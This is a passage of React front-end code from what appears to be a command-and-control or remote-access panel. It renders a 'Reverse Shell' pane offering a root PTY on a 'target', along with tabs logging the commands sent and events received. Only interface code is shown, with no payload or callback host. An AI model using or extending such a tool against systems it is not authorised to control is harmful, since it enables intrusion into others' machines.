            <span className={`text-xs ${status === 'busy' ? 'text-amber font-bold' : 'text-fg-3'}`}>
              {status === 'connected' ? 'live' : status === 'connecting' ? 'opening...' : status === 'busy' ? 'slot in use' : 'closed'}
            </span>
            <div className="ml-auto flex items-center gap-2">
              {(status === 'disconnected' || status === 'error' || status === 'busy') && (
                <button className="nb-btn-main px-3 py-1 text-xs" onClick={connect} disabled={!t.online}>
                  Reconnect
                </button>
              )}
              {(status === 'connected' || status === 'connecting') && (
                <button className="nb-btn px-3 py-1 text-xs" onClick={disconnect}>
                  Disconnect
                </button>
              )}
            </div>
          </div>
          <div ref={termRef} className="flex-1 bg-[#1a1028]" style={{ padding: '8px' }} />
        </>
      ) : (
        <div className="flex-1 flex items-center justify-center h-full">
          <div className="text-center px-6 py-10">
            <div className="mx-auto w-16 h-16 rounded-[var(--radius)] border-2 border-border bg-[#1a1028] flex items-center justify-center mb-5 shadow-[3px_3px_0px_0px_var(--color-border)]">
              <SquareTerminal size={28} className="text-[#a78bfa]" />
            </div>
            <div className="text-lg font-bold mb-1">Reverse Shell</div>
            <div className="text-sm text-fg-3 mb-6 max-w-xs">Root PTY via SHELL callback</div>
            <button
              className="nb-btn-main px-6 py-2.5 text-sm font-bold flex items-center gap-2 mx-auto"
              onClick={connect}
              disabled={!t.online}
            >
              <SquareTerminal size={16} /> Connect
            </button>
            {!t.online && (
              <div className="text-sm text-red mt-4 font-bold">Target offline</div>
            )}
          </div>
        </div>
      )}
    </div>
  )
})

/* -- Log + Events -------------------------------------------- */

function LogTab({ entries }) {
  if (!entries.length) return <div className="p-8 text-center text-fg-3">No commands sent yet</div>
  return (
    <div className="overflow-auto">
      <table className="w-full text-sm">
        <thead>
          <tr className="border-b-2 border-border bg-bg-2 sticky top-0">
            <Th>Time</Th><Th>Command</Th><Th>Status</Th><Th>Response</Th>
          </tr>
        </thead>
        <tbody>
          {entries.map((l, i) => (
            <tr key={i} className="border-b border-border">
              <td className="px-4 py-2 font-mono text-fg-3">{l.time}</td>
              <td className="px-4 py-2 font-mono font-bold">{l.cmd}</td>
              <td className="px-4 py-2"><StatusPill ok={l.ok} /></td>
              <td className="px-4 py-2 font-mono text-fg-3 truncate max-w-xs">{l.reply}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}

function EventsTab({ events }) {
  if (!events.length) return <div className="p-8 text-center text-fg-3">No events yet</div>
  return (
    <div className="overflow-auto">
      {[...events].reverse().map((e, i) => (
        <div key={i} className="flex items-center gap-4 px-4 py-2.5 border-b border-border hover:bg-bg-2">
          <span className="font-mono text-sm text-fg-3 w-16 shrink-0">{e.time}</span>
          <EventBadge type={e.type} />
          <span className="font-mono text-sm text-fg-2">{e.msg}</span>
        </div>
      ))}
    </div>
  )
}

